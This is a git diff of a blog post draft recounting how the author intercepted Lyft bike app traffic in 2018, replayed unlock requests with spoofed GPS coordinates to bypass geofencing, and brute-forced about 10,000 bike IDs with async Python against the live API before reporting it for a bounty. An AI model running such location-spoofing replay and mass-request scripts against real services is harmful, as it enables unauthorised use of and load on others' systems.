@@ -18,7 +18,7 @@ I learned a ton, so I'm sharing the journey in case you may too.
 
 [Skip to technical summary →](#technical-summary)
 
-> **Disclaimer:** This writeup is meant for education purposes only. Vulnerabilities discussed were disclosed to and patched by Lyft in 2018.
+> **Disclaimer:** This writeup is meant for educational purposes only. Vulnerabilities discussed were disclosed to Lyft and patched in 2018.
 > 
 
 ## Table Of Contents
@@ -37,11 +37,11 @@ Back in 2018 Lyft Bikes (BayWheels) used to be [Ford GoBikes](https://automotive
 
 <img src="/images/blog/lyft-bikes/ford-gobikes.webp" alt="Ford GoBikes" style="border-radius: 8px">
 
-My goal was to make sure nobody could take a bike while I was on-route to the station, so what if I just kept manually generating codes until I arrived? Maybe that might block others from doing so. So I tried it. No luck. Generating a code didn't block others, and that was the only way to unlock bikes. Welp, nothing left to try...
+My goal was to make sure nobody would take a bike while I was on-route to the station, so what if I just kept manually generating codes until I arrived? Maybe that might block others from doing so. So I tried it. No luck. Generating a code didn't block others, and that was the only way to unlock bikes. Welp, nothing left to try...
 
 ...until the next day, when [Lyft acquired Ford GoBikes](https://www.lyft.com/blog/posts/lyft-to-acquire-us-bikeshare-leader) and the whole unlock mechanism changed. All hail Lyft.
 
-The new Lyft map also showed bikes at stations, but now you'd unlock a bike directly by scanning a QR code on it. Each bike also had 4-digit number you could use in case scanning didn't work. Maybe if I typed a bike's code into my app when I left, it would be unlocked (and hopefully still there) by the time I arrived? So I tried it.
+The new Lyft map also showed bikes at stations, but now you'd unlock a bike directly by scanning a QR code on it. Each bike also had 5-digit number you could use in case scanning didn't work. Maybe if I typed a bike's code into my app when I left, it would be unlocked (and hopefully still there) by the time I arrived? So I tried it.
 
 `You are too far from this station.`
 
@@ -69,11 +69,11 @@ SSL ensures traffic from the Lyft app is encrypted using the `lyft.com` public k
   <img src="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.12.36_PM.png" alt="SSL Certificate" width="50%">
 </picture>
 
-In theory, this means my traffic is perfectly un-snoopable, even by me. However, Charles has a workaround: by enabling `SSL Proxying`, Charles will prevent the real `lyft.com` SLL certificate from making it back to your phone, and instead sends a new one it generates on the fly.
+In theory, this means my traffic can't be decrypted once it leaves my phone, even by me. However, Charles has a workaround: by enabling `SSL Proxying`, Charles will prevent the real `lyft.com` SLL certificate from making it back to your phone, and instead sends a new one it generates on the fly.
 
 ![Screenshot 2026-01-01 at 2.09.23 PM.png](/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.09.23_PM.png)
 
-This means your phone is now encrypting `lyft.com` traffic with Charles's public key, so Charles can decrypt it, save it, then re-encrypt with the *real* `lyft.com` cert and forward it along.
+This means your phone is now encrypting `lyft.com` traffic with Charles's public key, so Charles can decrypt it, save it, then re-encrypt it with the *real* `lyft.com` cert and forward it along.
 
 ![Screenshot 2026-01-01 at 2.09.30 PM.png](/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.09.30_PM.png)
 
@@ -81,7 +81,7 @@ But there's a catch – your phone will reject a certificate unless it's been si
 
 ## Anatomy of a Lyft Request
 
-So, let's unlock a bike shall we?
+So, let's unlock a bike from my phone, shall we?
 
 `Vehicle not found.`
 
@@ -96,20 +96,20 @@ POST "https://layer.bicyclesharing.net/mobile/v2/fgb/rent"
 
 HEADERS
 {
-  "api-key": "API_KEY_123",
-  "authorization": "API_TOKEN_123",
+  "api-key": "sk-XXXXX",
+  "authorization": "bearer-XXXXX",
   ...
 }
 
 DATA
 {
   "userLocation": { "lat": 37.7714859, "lon": -122.4449036 },
-  "qrCode": { "memberId": "mem123", "qrCode": "12345" },
+  "qrCode": { "memberId": "user-XXXXX", "qrCode": "12345" },
   ...
 }
 ```
 
-Yup, looks like it is. Look at these fields (*I omitted the unrelated, redacted the sensitive.*) There's some auth in the headers (`api-key`, `authorization`), the dummy bike `qrCode` I used (`12345`), a `memberId` which I assume identifies my account, and... `userLocation` coordinates! Bingo. Now I just need to replay that request with a python script, but set the `lat`, `lon` to be right next to the station (whose coordinates I got using google maps).
+Yup, looks like it is. Look at these fields (*I omitted the unrelated, redacted the sensitive.*) There's some auth in the headers (`api-key`, `authorization`), the bike `qrCode` I used (`12345`), a `memberId` which I assume identifies my account, and... `userLocation` coordinates! Bingo. Now I just need to replay that request with a python script, but set the `lat`, `lon` to be right next to the station (whose coordinates I got using google maps).
 
 ```python
 import requests
@@ -117,8 +117,8 @@ import requests
 url="https://layer.bicyclesharing.net/mobile/v2/fgb/rent"
 
 headers={
-  "api-key": "API_KEY_123",
-  "authorization": "API_TOKEN_123",
+  "api-key": "sk-XXXXX",
+  "authorization": "bearer-XXXXX",
 }
 
 station_coords = { "lat": 37.7730627, "lon": -122.4390777 }    # from maps
@@ -126,7 +126,7 @@ bike_id = "12345"                                              # dummy id
 
 data={
   "userLocation": station_coords,
-  "qrCode": { "memberId": "mem123", "qrCode":  bike_id},
+  "qrCode": { "memberId": "user-XXXXX", "qrCode":  bike_id},
 }
 
 requests.post(url, headers=headers, json=data)
@@ -134,7 +134,7 @@ requests.post(url, headers=headers, json=data)
 
 Sweet, now I just needed a real `bike_id` to test it on. It was very late at night[^2] but I was excited, so out I went with my PJs, flip flops, and laptop to squat by my target bike. I found its ID, entered it into my script, hit run, and holy shit it worked. The bike unlocked. I re-locked it, ran back to my apartment, hit run again, ran back, and there she was. Unlocked, and inconspicuously so. Nobody would think to take it… but me.
 
-We’re in business.
+We were in business.
 
 ## I Promise it’s not a Denial of Service Attack
 
@@ -149,7 +149,7 @@ for i in range(10_000, 20_000):
     print(i)
 ```
 
-This, however, takes a second *per request*. So… ~three hours for 10,000 requests.
+This, however, takes ~a second *per request*. So… ~three hours for 10,000 requests.
 
 ```python
 def payload(i):
@@ -165,7 +165,7 @@ for i in range(10_000, 20_000):
     send_one(i)
 ```
 
-But we don’t have to wait for each request to come back – we can run them in parallel. After trying `multiprocessing` and `threading`, I massaged a stack overflow code snippet using `aiohttp` to start a bunch of requests without blocking on a response. Here’s a simplified version.[^4]
+But we don’t have to wait for each request to come back – we can run them in parallel. After trying `multiprocessing` and `threading`, I massaged a stack overflow code snippet I found using `aiohttp` to start a bunch of requests without blocking on a response. Here’s a cleaned-up version.[^4]
 
 ```python
 import asyncio, aiohttp
@@ -181,47 +181,163 @@ async def main():
 asyncio.run(main())
 ```
 
-I benchmarked this against [Postman’s API](https://www.postman.com/) (meant for testing) and it ran in 15 seconds! That’s 650 RPM. Hm… is that too much for their servers? In April of 2018 [there were an average of 3,370 trips per weekday](https://www.sfmta.com/media/14273/download?inline=) So even if 80% of those all happened during rush hour (8-10am, 5-7pm) that’s still a whopping 11 RPM. I’d be single-handedly 60x-ing their peak traffic.
+I benchmarked this against [Postman’s API](https://www.postman.com/) (meant for testing) and it ran in 15 seconds! That’s 650 RPM. But, hm… is that too much for their servers? In April of 2018 [there were an average of 3,370 trips per weekday](https://www.sfmta.com/media/14273/download?inline=) So even if 80% of those all happened during rush hour (8-10am, 5-7pm) that’s still a whopping 11 RPM at its _peak_. I’d be single-handedly 60x-ing their peak traffic on this endpoint. To be fair, (Google informed me,) 650 RPM is not _that_ crazy for most servers. But a sudden spike like that might still look to Lyft like a [Denial-of-Service attack]()...
 
-In practice, however, this hit a ton of limits and failures caused by going this hard. The solution was to cap at ~1000 connections, which brought execution to  ~30 minutes
+```
+...which it's not. Let me know if this is an issue and I'll stop.
 
-But as days passed by, and I played with unlocking different bikes I noticed a pattern which slowly turned into a suspicion. `13576`. `17364`. `18921`. `13224`. `16618`… do you see it? All IDs seemed to sit roughly between `10000` and `20000`– that’s just 10,000! A whole order of magnitude less. 
+I'm just a student, please don't call the cops.
 
- So for days I checked every bike I passed.  Wait, are these *all* between `10,000` and `20,000`?
+Sincerely,
+Ilan
+```
 
-- this is how tracked united healthcare murderer on lyft bikes
-- putting camera on station?
-- not that many ids...
-- emails to companies
-- fast async requests
-- unlocked extra bike? huh
+Aaaand sent – both to `security@lyft.com`, and the hosting company that powered the Lyft bikes API. Ok now let's run it on all the IDs.
+
+## The Test
+
+I'm about to run `python unlock_script.py` when a thought occurs to me: Is there _any_ chance, however slim, that I'm about to unlock every single Lyft Bike in and around the Bay Area? The geofence should prevent that, _in theory_. Only the station at my selected coordinates should respond. But what if it fails? What if– eh screw it, let's live a little [^5]
+
+`Enter ⏎`
+
+10,000 IDs fly through my screen.
+
+1000 not-so-milli seconds tick by. Then, I get my first
+
+`You are too far from this station.`
+
+Then another. They start to trickle in, slowly at first, then suddenly flood my terminal. Ok, that's a good sign. I'm not actively unlocking the whole city. Then, another second or so pass by, until...
+
+```
+Bike 12539 unlocked
+```
+
+[aggressive celebration success meme]
+
+Fuuuuuuck yesss! Oh my fucking god it worked! It actually wor–
+
+```
+Bike 17322 unlocked
+Done.
+```
+
+Wait, what? Um. Ok? Two bikes got unlocked? That's strange, my Lyft membership only allows me to unlock one bike at a time. But hey, a) I didn't unlock the whole city, and b) it worked, so what do I care. Let's go find my bikes.
+
+And there they were. Resting peacefully in their docks, but secretly not actually locked. If someone tried scanning it, they'd just see an error and try a different one. I had accomplished what I had set out to do.
 
 ## The Good Days
 
-- bike always there, would re-lock second unlocked bike
-- unlocked e-bike, saw someone take it
-- eleanor tells me
-- panic
+Boy did I enjoy it. Every morning I'd wake up, get ready fork work, run my script, glace at the unlocked ID (sometimes two), leasurely stroll to the station, (re-lock the second bike if necessary), and be on my merry way.
 
-## Man on the Inside
+I mostly kept this to myself, and a few trusted people including my parents, who were happy for me but nervous that I was now a criminal waiting to be arrested.
 
-- hacker 1 disclosure -> not even eligible?
-- non-brute force guidelines
-- roommate telling me about discussion at lyft about me
-- bounty
-- lyft intern party
+But what fun, and what a pleasently happy ending.
+
+
+```
+[imessage/messenger bubble]
+hey ilan! i know this is super out of the blue, but are you doing anything with the lyft bikes api?
+```
+
+Oh.
+
+Oh no.
+
+```
+Hey! um, potentially? Why?
+```
+
+```
+oh lmao. i'm interning there and just saw an internal sev email about this and for some reason thought of you
+```
+
+Oh no.
+
+```
+Oh lol wait is sev "severe"?
+
+Should I stop?
+```
+
+```
+It just means there was an incident lol
+
+were you reverse engineering endpoints?
+```
+
+```
+Ok I'm I don't want to get in trouble so
+```
+
+```
+loll
+```
+
+```
+Yeah, why?
+```
+
+```
+ok yeah that's what the email was about
+```
+
+```
+Hmmmmm should I be nervous?
+```
+
+```
+It says "potentially DoS but probably just trying to reverse engineer"
+
+lmao
+
+I think just stop doing it
+```
+
+Panic? Panic.
+
+## Saving My Ass
+
+I think I spent ~two and a half minutes hyperventilating before I decided to start using my brain. How do hackers avoid getting arrested? Responsible disclosure. Companies will give bounties to people who report vulnerabilities, so hackers can keep hacking legally, and companies get to fix issues. Win–win! And maybe, just maybe, I could use this to avoid getting arrested. Win-win-win!
+
+So I found [HackerOne](), and immediately a problem: [Lyft's vulnerability disclosure guidelines]() state brute-force approaches aren't elligible. In reality, my approach wasn't bypassing anything at all – I was still unlocking a bike and paying ike normal. No bugs to be reported. Although... the second bike! Definitely not normal behavior, and I wasn't getting charged for it. Let's hope it's enough.
+
+```
+[hacker one submission]
+```
+
+And now we wait. Except by sheer coincidence[^6], my summer roommate was _also_ working at Lyft, and found the thread discussing my vulnerability report. Apparently some claimed it was inelligible, but one very nice man was arguing it was legit. Wondering whether I'd get arrested had suddenly turned into wondering if I'd get paid instead. What a world we live in.
+
+In the end, I got a nice little $250 bounty, with an additional $250 bonus for a "good report". I then did the only thing I could imagine doing with $500 as a student and threw a stocked-up little house party...
+
+...and, naturally, invited all the Lyft interns.
 
 # Technical Summary
 
-Breakdown
+Goal: Remotely unlock a Lyft bike.
 
-# Notes
+- Capture outgoign Lyft app unlock request
+- Replay, but override location to bypass geofencing
+- 
 
-- make the -f+d in git diff formatting
+I used Charles Proxy to capture outgoing requests from the Lyft app on my phone.
 
-# Dump
+![Screenshot 2026-01-01 at 2.18.19 PM.png](/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.18.19_PM.png)
 
-a sight I had been dreading: an empty Lyft Bike station. I had checked the app at 8:24am, there had been two bikes there. Yet when I arrived five minutes later, they were gone. Snagged before I arrived.
+Enabled `SSL Proxying` with Charles, which 
+
+<picture>
+  <source srcset="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.12.36_PM.png" media="(prefers-color-scheme: dark)">
+  <img src="/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.12.36_PM.png" alt="SSL Certificate" width="50%">
+</picture>
+
+In theory, this means my traffic can't be decrypted once it leaves my phone, even by me. However, Charles has a workaround: by enabling `SSL Proxying`, Charles will prevent the real `lyft.com` SLL certificate from making it back to your phone, and instead sends a new one it generates on the fly.
+
+![Screenshot 2026-01-01 at 2.09.23 PM.png](/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.09.23_PM.png)
+
+This means your phone is now encrypting `lyft.com` traffic with Charles's public key, so Charles can decrypt it, save it, then re-encrypt it with the *real* `lyft.com` cert and forward it along.
+
+![Screenshot 2026-01-01 at 2.09.30 PM.png](/images/blog/lyft-bikes/Screenshot_2026-01-01_at_2.09.30_PM.png)
+
 
 [^1]: Simplification.
 
@@ -230,3 +346,7 @@ a sight I had been dreading: an empty Lyft Bike station. I had checked the app a
 [^3]: Except for eBikes, which were very few at this point, and which flash very conspicuously when unlocked as I found out after having to trek to re-lock one I accidentally unlocked across the city during testing.
 
 [^4]: semaphores
+
+[^5]: I did, in fact, test this out with smaller ID ranges to convince myself I wasn't unlocking bikes at other stations. But I had never run the full-range test so I was still nervous (and it sounds more exciting this way.)
+
+[^6]: or playa magic
